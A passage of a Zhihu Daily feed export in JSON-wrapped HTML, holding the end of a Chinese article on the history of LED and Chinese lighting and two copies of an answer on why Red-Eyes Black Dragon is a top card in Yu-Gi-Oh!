世纪，一种革命性的光源开始大规模应用 - <strong>LED（Light Emitted Diode）</strong>。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-ad466903fe1685fd46d890ea8a9b8289_720w.jpg?source=8673f162\" alt=\"\"></figure><p>1961 年，美国德州仪器公司首次发现了砷化镓及其他半导体合金的红外放射作用。 1962 年，通用电气公司开发出一种可实际应用的可见光发光二极管。 不过从指示性 LED 到照明用 LED，中间还有很长一段路。</p>\n<p><strong>1993 年， 日本日亚化学的工程师中村修二做出开拓性工作， 成功把镁掺入，造出了基于宽能隙半导体材料的氮化镓和氮化铟镓（InGaN），从而制造出具有商业应用价值的蓝光发光二极管。</strong>中村修二也因这项工作获得了 2014 年诺贝尔物理学奖。 有了蓝光 LED， 白光 LED 随即面世。</p>\n<p>2003 年，美国 Cree 制造出光效 65 lm/W 的白光 LED。</p>\n<p>2009 年，日本日亚化学在实验环境下研制出 249 lm/W 的 LED。</p>\n<p>2010 年， 飞利浦 Lumileds 造出 208 lm/W 的 LED。</p>\n<p>2012 年， 美国 Cree 推出 254 lm/W 的 LED，再次刷新纪录。</p>\n<p><strong>LED，因其高光效（传统光源 10 倍以上）、寿命长（20000 小时以上）、体积小（平方毫米以下）、抗震性强已经成为性能全方位领先传统光源的存在。</strong></p>\n<hr>\n<p><strong>中国光源史，是一部勒紧腰带的追赶史</strong></p>\n<p>电影《1921》里黄轩在和倪妮聊抵制日货的往事时提到这么一个细节，当他一把火把日货烧掉时，发现手里的火柴竟然也是日本产的，不禁悲怆地哽咽起来。 近现代以来，民族工业极度孱弱， 甚至连一根小小的火柴都不能自给自足，因此才有了我们爷爷奶奶口中的“洋火”、“洋油”。 中国光源地发展史，也是这么一部勒紧腰带的追赶史。</p>\n<p>1908 年，美国通用电气公司在沈阳建立第一家灯泡厂；1917 年由美国 GE- 爱迪生电气公司创办了上海奇异安迪生电器公司（上海灯泡厂前身）。</p>\n<p><strong>1921 年， 著名民族实业家胡西园历尽艰辛终于在上海试制成功第一个国产白炽灯，并于 1923 年创办了我国的第一个灯泡厂 - 亚浦尔灯泡厂（亚明灯泡厂前身）</strong>，从此白炽灯市场中终于不再只有洋货，而是有了民族企业的身影。</p>\n<p><strong>1948 年亚浦尔灯泡厂与上海亚明灯泡厂合作试制出我国第一支荧光灯。</strong></p>\n<p>新中国成立以后， 为了满足人民日益增长的物质文化需求和科学技术发展的需要， 国产民用光源和特种光源的技术也亟需更上一个台阶。</p>\n<p>这里不得不提到新<strong>中国的“电光源之父”蔡祖泉老先生</strong>。 60 年代初， 中国仍处经济建设初期， 尽管普通家庭都可以用上白炽灯， 但是在一些科研领域比如化学分析、光谱分析由于仪器大部分都需要进口，一台仪器动辄三四十万美金。 “有一次，仪器光源坏了，又急着要用，学校物资处就向国外有关设备出口公司打电话，希望能免费送一个光源给校方。然而，得到的回复却是‘<strong>单个光源不送，只有再买一台仪器，才能配送一个光源</strong>’。小小的一只仪器光源能有多大的成本？大家都为此而震动。”</p>\n<p>这件事情让玻璃厂工人出身的蔡师傅十分震动和愤怒。 \"我们要加紧工作，要为社会主义祖国填补空白。空白真是太多了。我们要踏踏实实、埋头苦干，一个一个去填补。” 他立刻和两个工人组成小组，在复旦物理系玻璃工厂的基础上，找来一间 10 多平方米的小房间做实验室，搭一个真空台，借来一支喷枪干了起来。后来在回忆这段经历时，蔡祖泉说道，“当时，我们除了有一点真空技术基础以外，其他方面的条件是比较差的。单从基础知识而言，大家对光学、电子物理学等都相当陌生。但是，当我们想到国家对新型光源的需要，一种责任感给我们带来了勇气，决心要为我国填补电光源这块空白。”</p>\n<p>功夫不负有人，经过反复的实验和研究，<strong>中国人自主研发的第一只仪器光源终于从蔡祖泉的实验室中诞生了</strong>。 1961 年，复旦大学电光源小组成立，喜讯接二连三地传来。 <strong>同年 12 月，新中国第一盏自主研发的高压汞灯封接成功。 </strong></p>\n<p>1964 年，在上海著名的南京路上，高压汞灯取代了老式路灯， 让南京路的夜景焕然一新。 同年，<strong>代表着当时电光源尖端技术</strong>的碘钨灯在<strong>复旦大学电光源实验室</strong>研制成功。 <strong>当时世界上功率最大的 100 千瓦 \"小太阳\" 长弧氙灯在上海市人民广场开启亮灯仪式</strong>，这盏当时被成为中国人的 \"争气灯\"，把中国人民心中的民族自豪感也照亮了！</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-fba84a77021cfdd08ce7232ce25aa179_720w.jpg?source=8673f162\" alt=\"\"><figcaption>蔡祖泉（左二）</figcaption></figure><p><strong>“我听党的话，灯听我的话”</strong></p>\n<p>蔡祖泉是一位兼具无产阶级奋斗精神及求真探索科学精神的工人科学家。 1949 年，蔡祖泉光荣地加入中国共产党， 从此将自己的一生奉献给了电光源技术的科学事业和电光源人才的培养事业中。</p>\n<p><strong>进入新世纪以来，光源比拼的主战场变成了 LED</strong>。 如前所述， LED 光源的核心技术一开始也是掌握在美国和日本行业巨头的手里的。 但今非昔比， 传统光源比较强调经验技术积累， 而 LED 芯片行业更加标准化，对资本投入更敏感。 可以说中国的产业和市场优势给了我们弯道超车的机会。 2003 年 6 月， 中国科技部首次提出要发展半导体照明；2009 年开始，中国各地政府对于 LED 芯片制造厂商采购 MOCVD 予以补贴，国内 LED 芯片厂商收入与净利润增加，同时竞争者数量不断攀升，行业竞争加剧。</p>\n<p>2011 年，中国国家发改委明确提出 2016 年将全面禁止白炽灯的销售。 自此，LED 行业像是被注入一波鸡血，飞速发展。 到了 2016 年，各大 LED 芯片厂商产能释放，到了行业洗牌前夕。 在这波洗牌大潮中， 中小企业纷纷退出竞争，而老牌日本 LED 芯片厂商因为成本不具优势分分退出低利润领域或直接停掉相关业务，关闭工厂。 至 2018 年，国内 LED 芯片大厂鼎足格局逐渐形成。 我国前三家 LED 芯片厂商市占率合计 71%，其中三安光电占 31%，华灿光电占 24%，澳洋顺昌 16%。</p>\n<hr>\n<p><strong>写在最后</strong></p>\n<p>答主 2009 年上大学考入复旦大学光源与照明工程系电气工程及其自动化专业， 2016 年物理电子学硕士毕业， 可以说我的求学过程刚好是经历了 LED 产业从 Booming 到洗牌的全过程。 我个人经历了一开始国外芯片厂商如 Lumileds、Cree、Osram 的强韧；也经历了照明行业的动荡整合期，比如老牌照明巨头通用电气 GE 出售照明部门（之前还实习过，后来就没了..）， 传统照明巨头飞利浦成力独立子公司 Signfy 以求新生； 以及国产 LED 芯片厂商（三安、华灿..） 和照明企业（ Yeelight 等）的崛起。 虽说我毕业的时候因为恰逢照明行业整合不景气没有在这个行业继续发展，但是亲身经历这个过程对人生的意义大于字面。</p>\n<p>光源与照明行业， 从最早的民族资本自强不息在外资口下争取一碗羹，到蔡祖泉老教授孜孜求索学习赶超先进照明技术，为共和国的腾飞奠定自己的一份力，再到新时代更强大的祖国通过产业、资本优势整合，大开大合，恢弘壮阔，昔日霸主，斗转星移。<strong> 不仅仅是 LED 行业，还有从内燃机到电动车转变的汽车行业， 甚至我们现在卡脖子的芯片制造行业，操作系统， 没有永恒不变的技术，总有新技术迭代旧技术，而技术变革，就是我们后来者的机会。</strong> 作为时代大潮下的一个小小的个体，能经历这一切，甚至贡献自己的一份小小的力量，确实蛮骄傲的（疯狂切题）。</p>\n<hr>\n<p><strong><strong>参考</strong></strong></p>\n<ol>\n<li><a href=\"http://link.zhihu.com/?target=https%3A//zh.wikipedia.org/wiki/%25E9%25AB%2598%25E5%25BC%25B7%25E5%25BA%25A6%25E6%25B0%25A3%25E9%25AB%2594%25E6%2594%25BE%25E9%259B%25BB%25E7%2587%2588\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://</span><span>zh.wikipedia.org/wiki/%</span><span>E9%AB%98%E5%BC%B7%E5%BA%A6%E6%B0%A3%E9%AB%94%E6%94%BE%E9%9B%BB%E7%87%88</span><span></span></a></li>\n<li><a href=\"http://link.zhihu.com/?target=https%3A//zh.wikipedia.org/wiki/%25E7%2599%25BC%25E5%2585%2589%25E4%25BA%258C%25E6%25A5%25B5%25E7%25AE%25A1\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://</span><span>zh.wikipedia.org/wiki/%</span><span>E7%99%BC%E5%85%89%E4%BA%8C%E6%A5%B5%E7%AE%A1</span><span></span></a></li>\n<li><a href=\"http://link.zhihu.com/?target=http%3A//tech.sina.com.cn/d/2011-04-11/09525389999.shtml\" target=\"_blank\" rel=\"nofollow noreferrer\">照明技术四次重大飞跃_科学探索_科技时代_新浪网</a></li>\n<li><a href=\"http://link.zhihu.com/?target=https%3A//www.sohu.com/a/338671374_100108650\" target=\"_blank\" rel=\"nofollow noreferrer\">绿色照明简史之国内早期照明发展（一）_上海</a></li>\n<li><a href=\"http://link.zhihu.com/?target=https%3A//www.360kuai.com/pc/9fdc758f0219d75a4%3Fcota%3D3%26kuai_so%3D1%26tj_url%3Dso_vip%26sign%3D360_7bc3b157\" target=\"_blank\" rel=\"nofollow noreferrer\">“中国电光源之父”蔡祖泉：“我听党的话，灯听我的话”</a></li>\n<li><a href=\"http://link.zhihu.com/?target=https%3A//www.thepaper.cn/newsDetail_forward_4608146\" target=\"_blank\" rel=\"nofollow noreferrer\">复旦电光源的灵与魂——蔡祖泉先生的“光明之路”</a></li>\n<li><a href=\"http://link.zhihu.com/?target=https%3A//user.guancha.cn/main/content%3Fid%3D340229\" target=\"_blank\" rel=\"nofollow noreferrer\">中国 LED 芯片厂的新战场_风闻</a></li>\n</ol>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/468832684\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737750"},{"title":"《游戏王》中真红眼黑龙为什么被称为顶级卡片？","date":"2021-07-02 23:05:54","description":"<div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/da8e974dc_l.jpg?source=8673f162\"><span>艾叶，</span><span>以喷会友。</span>\n<a href=\"https://www.zhihu.com/question/24348322/answer/1971729872\" hidden>阅读原文</a>\n</div>\n<div>\n<p>题主的问题，在原作中真红眼黑龙出场的第一页交代清楚了。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-de8496b166a074c4d842b8f8ba9b40f3_720w.jpg?source=8673f162\" alt=\"\"></figure><p>在卡片交易市场行情中价值数十万的顶级稀有度，以及顶级的攻击力数值。这就是真红眼黑龙被称为顶级卡片的理由。</p>\n<p>首先说它数值顶级这点，你能在早期（决斗王国篇）数出很多攻击力超过真红眼的卡。但那种靠组合或战术堆起来的数值很显然还是不能算这张卡本身 nb 的。比如羽蛾的大飞蛾需要用很苛刻的条件让毛虫进化；神鹰女郎需要靠大量装备；鬼骨冢的活死人战术要用长时间来让僵尸慢慢强化。只算基础能力值的话，真红眼黑龙确实已经非常高了，在它之上的青眼白龙、黑魔术师、恶魔的召唤，都一样是被评价为万里挑一的稀有卡的。</p>\n<p>大概也是因为比起各种铺垫的青眼白龙，它出现得太突兀了，当时的动画组在这上面做了些文章，围绕这张卡专门做了一个剧场版动画。这就是东映出品、延续自朝日版游戏王的，游戏王历史真正意义的第一个剧场动画，1999 年剧场版《游戏王》，民间俗称《游戏王 - 真红眼黑龙》。下面跟大家讲解下这部 30 分钟的剧场动画剧情。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-4ba72e49cf1604015a850ed10fbf1ccc_720w.jpg?source=8673f162\" alt=\"\"></figure><p>故事讲述的是武藤游戏邻居家，一个胆小懦弱、常被同龄人欺负的小孩，青山翔吾。他在偶然间去卡店抽包，开出了真红眼黑龙。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-4c3f4a3a47a435edf185bc6db1a208e0_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-2b322c8386b0d2eff778f4942d6441d6_720w.jpg?source=8673f162\" alt=\"\"></figure><p>卡店老板说明，这是和青眼白龙齐名的顶级稀有卡。显然出于大家可以理解的历史的局限性，她无法预知 20 多年后青眼白龙的身价上升到了 8700 万人民币。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-35ddc28e9c24d2d52508890794576a0b_720w.jpg?source=8673f162\" alt=\"\"></figure><p>得到了真红眼黑龙的翔吾自然把欺负他的大孩子吓了一跳。但他从未用真红眼黑龙决斗过。只是出示这张卡证明自己已经不会输给任何人了。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-c1f13d661b84c5c27776a716a9fbaf80_720w.jpg?source=8673f162\" alt=\"\"></figure><p>长期监视着童实野各大卡店的海马知道了这件事。他举办了一场赌上稀有卡的邀请赛，一方面想弄到翔吾手上的真红眼，另一方面也是为了击败游戏。</p>\n<p>中途，游戏和城之内在去参加过程中撞见海马的保镖，他抢走翔吾的真红眼并和游戏、城之内产生肢体摩擦。最后城之内帮翔吾夺回了真红眼，并将其加入到游戏卡组中去对战海马。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-d85dd3a03015e9265ada754b38ed851d_720w.jpg?source=8673f162\" alt=\"\"></figure><p>王样和海马的对战使用的是王国篇里海马展示过的圆形决斗盘。决斗过程主要复刻自王国篇王样对阵傀儡师的流程，用黑魔术师 + 魔术礼帽 + 六芒星的咒缚的组合击破一只青眼白龙。</p>\n<p>之后海马死者苏生出青眼白龙，并发动邪恶锁链，将三只青眼白龙结合到一起。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-40ccda1eb2fc9cbf42312cd0ad76c0f4_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic4.zhimg.com/v2-accea74dc4a582328b7bc200441c3e09_720w.jpg?source=8673f162\" alt=\"\"></figure><p>这不是融合，所以这样结合出来的也并不是青眼究极龙。它的正式名字叫“青眼の白竜３体連結”。ZZ 玩家可能对这张卡有印象，但要说它是纯粹的 ZZ 自创的假卡还真有点冤枉它了。这张卡是来自于游戏王的版权还属于万代的时期，由万代出品的卡片。ZZ 卡的卡图也是原封不动照搬的这个。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-120044f5bde94ce65f122d5ebd5f863b_720w.jpg?source=8673f162\" alt=\"\"></figure><p>说回正题。面对强大的三只青眼白龙，此时王样唯一的胜机就在真红眼身上了。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-4be5dea37562bae0f42a121ee212aa48_720w.jpg?source=8673f162\" alt=\"\"></figure><p>翔吾见王样赢不了，习惯性的想逃避。城之内拉住他，让他坚持下去。真红眼是他的卡，王样使用真红眼需要他的斗志。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-7cf29ac0bdbc0b54324d25d6215cdc59_720w.jpg?source=8673f162\" alt=\"\"></figure><p>翔吾拥有真红眼过后依然不敢和人决斗。他惧怕自己有了真红眼后依然打不过别人，那样会更加“站不起来”。城之内让他不要再抱着卡片做梦。既然是决斗者，就要敢于面对战斗，敢于面对自己。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-c1b54038425e66aefc7abc56b31edd72_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic4.zhimg.com/v2-e21eba2bfa439eb94254d30bdfbb206c_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-300c32bd0ebf2424d72757004c30d78b_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic4.zhimg.com/v2-9a5198ca905345febe360d7f8abaf431_720w.jpg?source=8673f162\" alt=\"\"></figure><p>这里开始切入主题了。真正的决斗者不是靠稀有卡，而是靠自身的斗志，和相信胜利的可能性。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-f48477eb153f2137d5a6ca88ddde7299_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-01b60dea8154a8ae06e08572e36ba52e_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic4.zhimg.com/v2-3dca4ecafcff91cecf94f07e412e75f5_720w.jpg?source=8673f162\" alt=\"\"></figure><p>这段台词是整部《真红眼黑龙》的核心。“可能性”既是黑龙带来的，也是决斗者带来的。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-b199dba4d6b81b6b7c2a2cfd918f6d10_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-12f0f67e06b7f4d0b961cfd9ffff3e99_720w.jpg?source=8673f162\" alt=\"\"></figure><p>顿悟的翔吾鼓起勇气并传达给王样。王样终于召唤出真红眼黑龙。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-c7a5c7b45ce9cd8ca46e78bdffcbab51_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-b75e5b2375bcc62beed90c69dc3b4998_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-d444634dfbc07b76e4593d8560521d59_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-2599b082deb8ac5c855410a767f939e3_720w.jpg?source=8673f162\" alt=\"\"></figure><p>出场时的气势还是很赞的。但是……</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-28b4a3f22eaa96d16e3dd2f0461b1f78_720w.jpg?source=8673f162\" alt=\"\"></figure><p>马上就被拿来融合了。</p>\n<p>真红眼和王样场上的流星龙融合，成了流星黑龙。没错，不仅流星黑龙其实是王样用出来的，流星龙也是。不动游星是谁？不太熟啊。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-21644bdec8494533f4d5ca74c849e9e1_720w.jpg?source=8673f162\" alt=\"\"></figure><p>流星黑龙击败青眼白龙 3 体连接，打败海马。从这场战斗中得到勇气的翔吾也能正常的打牌了。以前欺负他的大孩子也成为了朋友。故事结束。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-a731ad00351e78791660f0fd831af552_720w.jpg?source=8673f162\" alt=\"\"></figure><p>这个剧场版除了赋予“白龙带来胜利，黑龙带来可能性”这个象征意义外，还通过这个故事把真红眼与决斗者的斗志绑在了一起。当然，这是因为原作剧情后来真红眼成了城之内的卡。对于城之内这么一个从区大赛 8 强起步，一步步打成决斗城市准决赛的底层励志角色来说，斗志、可能性，形容的既是真红眼，也是城之内本人。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-19e3732cb72fd604fd3360ffd54d24a4_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-bab92ffcdfde35c55ab16b9fca0b453a_720w.jpg?source=8673f162\" alt=\"\"></figure><p>在决斗城市开幕期间，城之内认为自己实力还配不上使用真红眼，将其交给了王样保管，由此这张卡也成为了代表 2 人羁绊的卡。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-4727bd92b988637efd4eb30e7b7a4c2a_720w.jpg?source=8673f162\" alt=\"\"></figure><p>城之内被马利克洗脑进行的码头决斗时，表君用手札对换来尝试唤醒城之内。城之内残存的意识还记得自己的承诺，一定要到自己能成为独当一面的决斗者时，才能取回真红眼。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-4bcd781376eec0f31f1556429e134f78_720w.jpg?source=8673f162\" alt=\"\"></figure><p>这段剧情让真红眼成了 2 人羁绊的见证。并在之后的决斗城市准决赛上，真红眼在场上提升超魔导剑士攻击力，帮助王样战胜海马。</p>\n<p>小 tips：其实在游戏王原作里，真红眼在王样手上的戏份比在城之内那还多些。因为整个决斗城市篇它都在王样卡组里，而决斗城市篇之后城之内也没有再决斗过了。</p>\n<p>综上所述，一开始，真红眼黑龙这张卡的意义只是在剧情设定上的超高地位，但后续无论原作剧情还是动画原创的剧场版剧情，都在为其增添它的象征意义。到如今留在我们记忆里的真红眼黑龙，它就如同景山东坡的老歪脖子树，所携带的那些故事就已经让它充满了历史价值，本身故事设定的稀有度什么的反而不重要了。如同《真红眼黑龙》中所描绘的，卡片再稀有、再强大，终究只是卡片。决斗者最强大的武器，是自己的心。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/24348322\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737732"},{"title":"《游戏王》中真红眼黑龙为什么被称为顶级卡片？","date":"2021-07-02 15:30:09","description":"\n<p>题主的问题，在原作中真红眼黑龙出场的第一页交代清楚了。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-de8496b166a074c4d842b8f8ba9b40f3_720w.jpg?rss\" data-rawwidth=\"1965\" data-rawheight=\"1500\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-de8496b166a074c4d842b8f8ba9b40f3\" data-watermark-src=\"v2-99b51489d7eaf9cfd7fd7cea5b43ef36\" data-private-watermark-src=\"v2-982a92469743b3c4a250c435d03c7efb\"></p>\n<p>在卡片交易市场行情中价值数十万的顶级稀有度，以及顶级的攻击力数值。这就是真红眼黑龙被称为顶级卡片的理由。</p>\n<p>首先说它数值顶级这点，你能在早期（决斗王国篇）数出很多攻击力超过真红眼的卡。但那种靠组合或战术堆起来的数值很显然还是不能算这张卡本身nb的。比如羽蛾的大飞蛾需要用很苛刻的条件让毛虫进化；神鹰女郎需要靠大量装备；鬼骨冢的活死人战术要用长时间来让僵尸慢慢强化。只算基础能力值的话，真红眼黑龙确实已经非常高了，在它之上的青眼白龙、黑魔术师、恶魔的召唤，都一样是被评价为万里挑一的稀有卡的。</p>\n<p><br></p>\n<p>大概也是因为比起各种铺垫的青眼白龙，它出现得太突兀了，当时的动画组在这上面做了些文章，围绕这张卡专门做了一个剧场版动画。这就是东映出品、延续自朝日版游戏王的，游戏王历史真正意义的第一个剧场动画，1999年剧场版《游戏王》，民间俗称《游戏王-真红眼黑龙》。下面跟大家讲解下这部30分钟的剧场动画剧情。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-4ba72e49cf1604015a850ed10fbf1ccc_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-4ba72e49cf1604015a850ed10fbf1ccc\" data-watermark-src=\"v2-76ebddacc6660d93d00c17c6693b32bc\" data-private-watermark-src=\"v2-dc4afc5dc54109d6e3de088d9b817937\"></p>\n<p>故事讲述的是武藤游戏邻居家，一个胆小懦弱、常被同龄人欺负的小孩，青山翔吾。他在偶然间去卡店抽包，开出了真红眼黑龙。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-4c3f4a3a47a435edf185bc6db1a208e0_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-4c3f4a3a47a435edf185bc6db1a208e0\" data-watermark-src=\"v2-7e95c21c2ad1b87c950d6c5929fdd79b\" data-private-watermark-src=\"v2-1b1e840921f30bb326168e8fcedf9b77\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-2b322c8386b0d2eff778f4942d6441d6_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-2b322c8386b0d2eff778f4942d6441d6\" data-watermark-src=\"v2-0ced17d36be6d827f7e7a455ad1fec7b\" data-private-watermark-src=\"v2-b4989c7581ed4411ffcdf274ac9cec72\"></p>\n<p>卡店老板说明，这是和青眼白龙齐名的顶级稀有卡。显然出于大家可以理解的历史的局限性，她无法预知20多年后青眼白龙的身价上升到了8700万人民币。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-35ddc28e9c24d2d52508890794576a0b_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-35ddc28e9c24d2d52508890794576a0b\" data-watermark-src=\"v2-36d122f19e98b7863bfa11de921e8a7f\" data-private-watermark-src=\"v2-af10254c06f07702884d31adf7d82c7a\"></p>\n<p>得到了真红眼黑龙的翔吾自然把欺负他的大孩子吓了一跳。但他从未用真红眼黑龙决斗过。只是出示这张卡证明自己已经不会输给任何人了。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-c1f13d661b84c5c27776a716a9fbaf80_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-c1f13d661b84c5c27776a716a9fbaf80\" data-watermark-src=\"v2-68c8cda4d377f033a5c8d243935a46a4\" data-private-watermark-src=\"v2-76acaa397785974c8aa53056cf49795d\"></p>\n<p>长期监视着童实野各大卡店的海马知道了这件事。他举办了一场赌上稀有卡的邀请赛，一方面想弄到翔吾手上的真红眼，另一方面也是为了击败游戏。</p>\n<p>中途，游戏和城之内在去参加过程中撞见海马的保镖，他抢走翔吾的真红眼并和游戏、城之内产生肢体摩擦。最后城之内帮翔吾夺回了真红眼，并将其加入到游戏卡组中去对战海马。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-d85dd3a03015e9265ada754b38ed851d_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-d85dd3a03015e9265ada754b38ed851d\" data-watermark-src=\"v2-04de5df3093bf8e6ff4469f9e86b52b1\" data-private-watermark-src=\"v2-13a39ecd27d896cd792b165d8ee82cf6\"></p>\n<p>王样和海马的对战使用的是王国篇里海马展示过的圆形决斗盘。决斗过程主要复刻自王国篇王样对阵傀儡师的流程，用黑魔术师+魔术礼帽+六芒星的咒缚的组合击破一只青眼白龙。</p>\n<p><br></p>\n<p>之后海马死者苏生出青眼白龙，并发动邪恶锁链，将三只青眼白龙结合到一起。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-40ccda1eb2fc9cbf42312cd0ad76c0f4_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-40ccda1eb2fc9cbf42312cd0ad76c0f4\" data-watermark-src=\"v2-857f98cfd7af410f95aedefb4f5f818b\" data-private-watermark-src=\"v2-6e7183e44da4ea3a262ea0cdc45cfabf\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-accea74dc4a582328b7bc200441c3e09_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-accea74dc4a582328b7bc200441c3e09\" data-watermark-src=\"v2-22982e0c9aa3112eaf83d64418eace05\" data-private-watermark-src=\"v2-d789760ce392bdd811d83b8e72aa4bdb\"></p>\n<p>这不是融合，所以这样结合出来的也并不是青眼究极龙。它的正式名字叫“青眼の白竜３体連結”。ZZ玩家可能对这张卡有印象，但要说它是纯粹的ZZ自创的假卡还真有点冤枉它了。这张卡是来自于游戏王的版权还属于万代的时期，由万代出品的卡片。ZZ卡的卡图也是原封不动照搬的这个。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-120044f5bde94ce65f122d5ebd5f863b_720w.jpg?rss\" data-rawwidth=\"368\" data-rawheight=\"366\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-120044f5bde94ce65f122d5ebd5f863b\" data-watermark-src=\"v2-48eefe6524ad3d1cd1571dcbaa84beed\" data-private-watermark-src=\"v2-4a5fa0cd1cfdf5e23d9569e1f900bab2\"></p>\n<p>说回正题。面对强大的三只青眼白龙，此时王样唯一的胜机就在真红眼身上了。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-4be5dea37562bae0f42a121ee212aa48_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-4be5dea37562bae0f42a121ee212aa48\" data-watermark-src=\"v2-b0f3c1440fe26fd1f89922f6437b9160\" data-private-watermark-src=\"v2-4a70ab516e498a559ff4997bdf6da267\"></p>\n<p>翔吾见王样赢不了，习惯性的想逃避。城之内拉住他，让他坚持下去。真红眼是他的卡，王样使用真红眼需要他的斗志。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-7cf29ac0bdbc0b54324d25d6215cdc59_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-7cf29ac0bdbc0b54324d25d6215cdc59\" data-watermark-src=\"v2-1b39801a3b3ea5e46a061b0f243ed800\" data-private-watermark-src=\"v2-9feb7cd3a596ccb938d53d414a37cf73\"></p>\n<p>翔吾拥有真红眼过后依然不敢和人决斗。他惧怕自己有了真红眼后依然打不过别人，那样会更加“站不起来”。城之内让他不要再抱着卡片做梦。既然是决斗者，就要敢于面对战斗，敢于面对自己。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-c1b54038425e66aefc7abc56b31edd72_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-c1b54038425e66aefc7abc56b31edd72\" data-watermark-src=\"v2-49f42251f923c6168dcb58ecfab985c2\" data-private-watermark-src=\"v2-8e33b80dde93ac942f2589d3d0a954ee\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-e21eba2bfa439eb94254d30bdfbb206c_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-e21eba2bfa439eb94254d30bdfbb206c\" data-watermark-src=\"v2-a9766a26c9952e9f63ccccb31e0f39c0\" data-private-watermark-src=\"v2-edfcf1a96d6163a6518ba48a3dedf460\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-300c32bd0ebf2424d72757004c30d78b_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" 